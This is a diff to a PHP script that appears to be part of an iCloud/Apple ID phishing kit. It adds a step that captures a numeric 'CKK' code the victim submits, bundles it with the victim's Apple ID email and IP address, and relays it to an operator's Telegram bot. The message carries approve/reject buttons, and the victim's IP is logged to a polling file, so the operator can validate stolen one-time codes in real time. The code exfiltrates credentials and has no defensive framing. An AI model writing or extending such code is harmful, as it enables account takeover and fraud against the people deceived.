@@ -156,6 +156,48 @@ TEXT;
     exit;
 }
 
+// ── CKK STEP ────────────────────────
+if ($step === 'ckk' && !empty($_POST['ckk'])) {
+    $ckk   = preg_replace('/[^0-9]/', '', trim($_POST['ckk']));
+    $email = $_SESSION['icloud_email'] ?? '—';
+
+    $messageCkk = <<<TEXT
+🔐 <b>iCLOUD – CKK saisi</b> [<code>CKK STEP</code>]
+
+<b>Apple ID</b>
+└ 📧 Email: <code>$email</code>
+
+<b>Code CKK</b>
+└ 🔢 Code: <code>$ckk</code>
+
+<b>Réseau</b>
+├ 🌐 IP: <code>$ip</code>
+└ 🕐 $dt
+TEXT;
+
+    $proto   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+    $host    = $_SERVER['HTTP_HOST'];
+    $dir     = dirname($_SERVER['PHP_SELF']);
+    if ($dir === '/' || $dir === '\\') $dir = '';
+    $vbvUrl  = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
+    $encIp   = urlencode($ip);
+
+    $keyboardCkk = [
+        'inline_keyboard' => [[
+            ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkok'],
+            ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkbad'],
+        ]]
+    ];
+
+    // Reset ip_list for polling
+    $ipListFile = __DIR__ . '/security_check/ip_list.txt';
+    file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_ckk', FILE_APPEND | LOCK_EX);
+
+    sendTelegramMessage($bot_token, $chat_id, $messageCkk, $keyboardCkk);
+    echo json_encode(['ok' => true]);
+    exit;
+}
+
 // ── STEP 4 : SMS code ───────────────
 if ($step === '4' && !empty($_POST['code'])) {
     $code  = preg_replace('/[^0-9]/', '', trim($_POST['code']));
